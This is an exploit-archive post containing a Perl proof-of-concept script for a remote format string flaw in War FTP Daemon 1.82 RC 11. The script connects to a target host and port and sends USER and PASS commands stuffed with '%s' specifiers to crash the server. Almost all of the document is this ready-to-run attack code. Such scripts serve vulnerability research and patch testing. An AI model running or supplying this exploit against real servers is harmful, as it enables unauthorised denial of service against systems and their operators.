# Exploit Title: War FTP Daemon Remote Format String Vulnerability
# crash: http://img826.imageshack.us/img826/6222/69004160.png
# Date: 2012-08-30
# Author: coolkaveh
# coolkaveh@rocketmail.com
# https://twitter.com/coolkaveh
# Vendor Homepage: http://www.warftp.org
# Version: War FTP Daemon 1.82 RC 11
# Tested on: windows XP SP3
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# War FTP Daemon Remote Format String Vulnerability
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/usr/bin/perl -w

use IO::Socket;
$|=1;
$host=shift || die "$0 \$host \$port\n";
$port=shift || die "$0 \$host \$port\n";
my $username = "%s%s%s%s%s%s%s%s%s%s%s%s";
my $password = "%s%s%s%s%s%s%s%s%s%s%s%s";
print "Launch Attack ... ";
$sock1=IO::Socket::INET->new(PeerAddr=>$host, PeerPort=>$port, Proto=>'tcp', Timeout=>30) || die "HOST $host PORT $port is down!\n";
if(defined($sock1)){
  $sock1->recv($content, 100, 0);
  sleep(2);
  $sock1->send("USER ".$username."\r\n", 0);
  $sock1->send("PASS ".$password."\r\n", 0);
  sleep(2);
  $sock1->recv($content, 100, 0);
  sleep(5);
  $sock1->close;
}
print "Finish!\n";
exit(1);
